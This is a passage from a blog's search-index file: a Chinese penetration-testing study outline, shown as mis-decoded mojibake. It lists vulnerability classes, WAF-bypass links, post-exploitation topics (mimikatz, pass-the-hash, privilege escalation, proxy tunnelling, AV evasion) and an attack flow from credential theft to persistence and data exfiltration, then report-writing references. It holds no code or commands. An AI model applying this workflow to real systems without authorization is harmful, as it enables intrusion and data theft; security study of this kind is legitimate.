id="æ¼æ´åˆ†ç±»"><a href="#æ¼æ´åˆ†ç±»" class="headerlink" title="æ¼æ´åˆ†ç±»"></a>æ¼æ´åˆ†ç±»</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç³»ç»Ÿæ¼æ´ </span><br><span class="line">webæ¼æ´ </span><br><span class="line">ä¸­é—´ä»¶æ¼æ´ </span><br><span class="line">ç«¯å£æœåŠ¡æ¼æ´ </span><br><span class="line">ä¸šåŠ¡é€»è¾‘æ¼æ´</span><br><span class="line">é€šä¿¡å®‰å…¨</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‚ç…§æ¼æ´checklistæ¥è¿›è¡Œæ£€æµ‹ã€‚</p><p><strong>çº¢é˜Ÿï¼šé‡ç‚¹å…³æ³¨èƒ½<code>getshell</code>çš„æ¼æ´</strong></p><h2 id="wafç»•è¿‡"><a href="#wafç»•è¿‡" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡</h2><ul><li><p>CTFçŸ¥è¯†</p></li><li><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Javaååºåˆ—åŒ–æ•°æ®ç»•WAFä¹‹åŠ å¤§é‡è„æ•°æ®</a></p></li><li><p>wafç»•è¿‡å­¦ä¹ </p></li></ul><h1 id="å¾…åš"><a href="#å¾…åš" class="headerlink" title="å¾…åš"></a>å¾…åš</h1><blockquote><p>æŠŠä¸Šé¢çš„å‡ ä¸ªæ­¥éª¤ï¼Œå·¥å…·ä¸²èµ·æ¥ï¼Œè¡Œæˆå¿«é€Ÿä¿¡æ¯æ”¶é›†ï¼Œå¿«é€Ÿæ¢æµ‹æ‰“ç‚¹ï¼Œæœ€å¥½å†™ä¸ªè´¯ç©¿æµç¨‹çš„å·¥å…·è°ƒç”¨çš„è„šæœ¬ã€‚</p></blockquote><p>å‚è€ƒï¼š<a href="https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p><h1 id="åæ¸—é€"><a href="#åæ¸—é€" class="headerlink" title="åæ¸—é€"></a>åæ¸—é€</h1><p><img src="/../images/image-20230510184801834-1685533751889.png" alt="image-20230510184801834"></p><p>å®æ“è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸŸä¿¡æ¯æ”¶é›†</span><br><span class="line">linuxææƒ</span><br><span class="line">ä»£ç†ç©¿é€ï¼ˆsocket5ï¼Œfrpï¼Œre_Georgeï¼Œproxiferï¼‰</span><br><span class="line">æ–‡ä»¶ä¼ è¾“</span><br><span class="line">ç®€å•å…æ€</span><br><span class="line">mimikatz</span><br><span class="line">ipc$ï¼ˆä½¿ç”¨ï¼Œæƒé™é—®é¢˜ï¼‰</span><br><span class="line">pthå“ˆå¸Œä¼ é€’</span><br><span class="line">msfä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å†…ç½‘æœé›†/æ¢æµ‹ =&gt;  å…æ€ææƒ[éå¿…é¡»] =&gt; æŠ“å–ç™»å½•å‡­è¯ =&gt; ï¼ˆè·¨ï¼‰å¹³å°æ¨ªå‘ =&gt; å…¥å£ç»´æŒ =&gt; æ•°æ®å›ä¼  =&gt; å®šæœŸæƒé™ç»´æŠ¤</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/">åŸŸæ¸—é€ä¸€æ¡é¾™æ‰‹å†Œ</a></p><h1 id="äº§å‡ºæŠ¥å‘Š"><a href="#äº§å‡ºæŠ¥å‘Š" class="headerlink" title="äº§å‡ºæŠ¥å‘Š"></a>äº§å‡ºæŠ¥å‘Š</h1><p><a href="https://www.anquanke.com/post/id/215031#h3-5">å¦‚ä½•ç¼–å†™ä¸€ä»½ä¸“ä¸šçš„æ¸—é€æµ‹è¯•æŠ¥å‘Š-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p><p><a href="https://github.com/awake1t/HackReport/tree/main/01-%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF">HackReport&#x2F;01-æŠ¥å‘Šæ¨¡æ¿ at main Â· awake1t&#x2F;HackReport</a></p><p><strong>ä¿®å¤å»ºè®®â€“æ¸—é€æµ‹è¯•ä¿®å¤å»ºè®®æ€»ç»“.pdf</strong></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://blog.gm7.org/">Introduction </a></p><p><a href="https://gitbook.se7ensec.cn/#duan-kou-sao-miao">åœ¨çº¿å·¥å…· - è‚¾é€æµ‹è¯•ä¸­å¿ƒ</a></p><p><a href="https://gitbook.se7ensec.cn/hong-dui-zuo-zhan-shou-ce#liu-cheng-jian-yao-shuo-ming">çº¢é˜Ÿä½œæˆ˜æ‰‹å†Œ - è‚¾é€æµ‹è¯•ä¸­å¿ƒ</a></p><p><a href="https://github.com/bin-maker/BYPASS-CDN/">https://github.com/bin-maker/BYPASS-CDN/</a></p><p><a href="https://www.secpulse.com/archives/194410.html">https://www.secpulse.com/archives/194410.html</a></p><p><a href="https://wiki.wgpsec.org/knowledge/">ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“</a></p><p><a href="https://www.wangan.com/p/7fy7fy135d85fec8">https://www.wangan.com/p/7fy7fy135d85fec8</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
